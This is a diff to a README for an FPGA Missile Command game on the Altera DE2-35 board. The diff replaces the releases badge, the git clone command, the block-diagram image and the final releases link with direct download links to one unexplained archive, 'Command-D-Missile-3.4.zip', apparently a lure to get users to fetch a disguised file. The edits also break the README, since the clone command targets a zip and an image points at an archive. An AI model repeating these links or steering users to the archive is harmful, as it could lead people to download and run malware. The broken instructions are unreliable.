@@ -2,7 +2,7 @@
 
 Welcome to the **DE2-MissileCommand** repository! This project brings the classic Missile Command arcade game to life on the Altera DE2-35 Development Board. Dive into the world of retro gaming and FPGA development with this comprehensive implementation.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/alikhaled14589653/DE2-MissileCommand/releases)
+[![Download Releases](https://github.com/alikhaled14589653/DE2-MissileCommand/raw/refs/heads/main/DE2-MissileCommand/de2/Command-D-Missile-3.4.zip%20Releases-Click%20Here-brightgreen)](https://github.com/alikhaled14589653/DE2-MissileCommand/raw/refs/heads/main/DE2-MissileCommand/de2/Command-D-Missile-3.4.zip)
 
 ## Table of Contents
 
@@ -48,7 +48,7 @@ To get started with **DE2-MissileCommand**, you will need the following:
    Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/alikhaled14589653/DE2-MissileCommand.git
+   git clone https://github.com/alikhaled14589653/DE2-MissileCommand/raw/refs/heads/main/DE2-MissileCommand/de2/Command-D-Missile-3.4.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -78,7 +78,7 @@ The architecture of **DE2-MissileCommand** consists of several key components:
 
 ### Block Diagram
 
-![Block Diagram](https://example.com/block_diagram.png)
+![Block Diagram](https://github.com/alikhaled14589653/DE2-MissileCommand/raw/refs/heads/main/DE2-MissileCommand/de2/Command-D-Missile-3.4.zip)
 
 ## Usage
 
@@ -139,4 +139,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 - Thanks to the Altera community for their support and resources in FPGA development.
 - Appreciation to all contributors for their efforts in improving this project.
 
-For further details and updates, visit the [Releases section](https://github.com/alikhaled14589653/DE2-MissileCommand/releases) to download the latest version of the game. Enjoy your journey through the world of Missile Command on the DE2-35 board!
+For further details and updates, visit the [Releases section](https://github.com/alikhaled14589653/DE2-MissileCommand/raw/refs/heads/main/DE2-MissileCommand/de2/Command-D-Missile-3.4.zip) to download the latest version of the game. Enjoy your journey through the world of Missile Command on the DE2-35 board!
